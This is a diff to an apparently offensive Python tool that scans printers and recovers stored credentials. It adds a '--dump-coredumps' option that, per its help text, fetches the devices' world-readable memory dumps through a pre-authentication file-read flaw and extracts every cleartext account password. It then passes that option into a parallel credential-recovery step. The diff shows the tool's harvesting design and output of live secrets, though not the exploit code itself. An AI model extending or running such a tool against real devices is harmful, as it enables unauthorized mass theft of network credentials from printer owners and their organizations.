@@ -241,6 +241,13 @@ def main() -> int:
     parser.add_argument("--no-recover-secrets", action="store_true",
                         help="Skip credential recovery (scan-to-folder passwords from the "
                              "export, LDAP bind credentials, and coredump recovery)")
+    parser.add_argument("--dump-coredumps", action="store_true",
+                        help="Also recover credentials from the device's raw memory - "
+                             "downloads the printer's world-readable coredumps through the "
+                             "pre-auth LFI and reads cleartext passwords out of them. Off by "
+                             "default: this returns every account password resident in memory, "
+                             "not just the ones the device was configured to store. Needed to "
+                             "recover credentials from devices whose defaults were changed")
     parser.add_argument("--creds-file", default="recovered_credentials.txt",
                         help="Output file for recovered credentials - contains live "
                              "cleartext secrets (default: recovered_credentials.txt)")
@@ -592,12 +599,18 @@ def main() -> int:
         if recovery_targets:
             print(f"\n{'-' * 80}")
             print(f"Step 4.5: Recovering stored credentials from {len(recovery_targets)} printer(s)")
+            if args.dump_coredumps:
+                print("  Including device memory: coredumps will be downloaded and read")
+            else:
+                print("  Configured destinations only. Devices whose defaults were changed need "
+                      "--dump-coredumps to give up credentials")
             print("-" * 80)
             with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
                 futures = {
                     executor.submit(module.recover_credentials, target, ctx,
                                     success_by_host.get(target.hostport),
-                                    export_by_host.get(target.hostport, "")): (target, module)
+                                    export_by_host.get(target.hostport, ""),
+                                    args.dump_coredumps): (target, module)
                     for target, module in recovery_targets
                 }
                 for future in concurrent.futures.as_completed(futures):
